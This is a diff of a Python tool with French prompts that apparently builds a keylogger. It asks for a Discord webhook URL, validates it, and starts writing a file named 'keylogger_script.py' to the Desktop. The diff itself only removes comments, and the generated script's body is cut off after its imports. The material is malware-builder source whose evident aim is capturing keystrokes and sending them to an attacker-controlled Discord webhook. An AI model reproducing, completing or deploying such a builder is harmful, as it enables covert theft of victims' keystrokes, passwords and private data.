@@ -9,14 +9,14 @@ import time
 import fade
 
 def clear_screen():
-    # Efface l'écran en fonction du système d'exploitation
+ 
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def prompt_webhook():
     clear_screen()
     print("Vous êtes de retour au programme.")
     
-    # Texte en couleur
+
     text = fade.greenblue(""",---,---,---,---,---,---,---,---,---,---,---,---,---,-------,
 | ~ | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 0 | [ | ] | <-    |
 |---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-----|
@@ -30,24 +30,24 @@ def prompt_webhook():
 '------'  '-----'--------------------------'------'  '------'""")
     print(text)
 
-    # Demander l'URL du webhook Discord
+   
     webhook_url = input("Entrez l'URL du webhook Discord : ").strip()
 
-    # Vérification de l'URL du webhook
+
     if not webhook_url.startswith("https://discord.com/api/webhooks/"):
         print("URL du webhook non valide.")
         input("Appuyez sur Entrée pour réessayer.")
-        return prompt_webhook()  # Redémarre la fonction pour ressayer
+        return prompt_webhook()  
 
     return webhook_url
 
 def generate_script(webhook_url):
-    # Définir le chemin du bureau et du fichier
+
     desktop = os.path.join(os.path.expanduser("~"), "Desktop")
     filename = "keylogger_script.py"
     file_path = os.path.join(desktop, filename)
 
-    # Contenu du script à écrire
+   
     script_code = f"""
 import ctypes
 import requests
